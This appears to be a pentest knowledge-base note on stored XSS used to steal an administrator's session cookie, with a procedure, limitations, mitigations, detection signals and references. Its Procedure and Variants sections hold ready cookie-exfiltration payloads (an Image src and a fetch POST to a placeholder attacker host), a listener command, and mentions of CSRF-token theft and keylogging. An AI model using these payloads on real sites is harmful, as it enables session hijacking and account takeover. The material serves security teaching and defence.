---
topic: Stored XSS — administrator cookie theft
tags: [web, xss, cookies, session-hijacking]
---

# Stored XSS — administrator cookie theft

[🇪🇸 Español](xss-cookie-exfiltration.md) | **English**

## Concept

Stored XSS in a field reviewed by an administrator runs JavaScript in their browser. If the session cookie lacks `HttpOnly`, the script reads it and sends it to the attacker, who reuses it to impersonate the account.

## When it applies

- A public form is rendered in a review panel or moderation queue.
- The session lives in cookies accessible from JavaScript.
- The administrator visits the page with a real or automated browser.

## Procedure

1. Confirm the field is rendered unescaped in the panel.
2. Inject a script that loads an external URL with `document.cookie`.
3. Receive the request on an HTTP listener.
4. Decode the cookie and substitute it in the browser.

```html
<script>new Image().src='http://<ATTACKER>/?c='+encodeURIComponent(document.cookie)</script>
```

```bash
python3 -m http.server 80
# wait for the request and decode the value
```

## Variants

- `fetch('http://<ATTACKER>/', {method:'POST', body:document.cookie})` avoids URL length limits.
- Steal the CSRF token and submit an administrative action.
- Keylog the panel's login form.

## Limitations

- `HttpOnly` prevents reading the session cookie.
- CSP without `unsafe-inline` blocks inline script.
- `SameSite=Strict` reduces the value of a stolen cookie outside its context.

## Mitigation

- Escape output and use autoescaping templates.
- `HttpOnly`, `Secure` and `SameSite=Lax` cookies.
- A restrictive CSP and HTML sanitization with a proven library.

## Detection

- Outbound requests from the administrator browser to unusual domains.
- `<script>` tags or `onerror` handlers in text fields.
- Cookies used from a different IP or user-agent.

## References

- [OWASP — Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [0xdf — Bankrobber](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html)
- [CWE-79 — Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
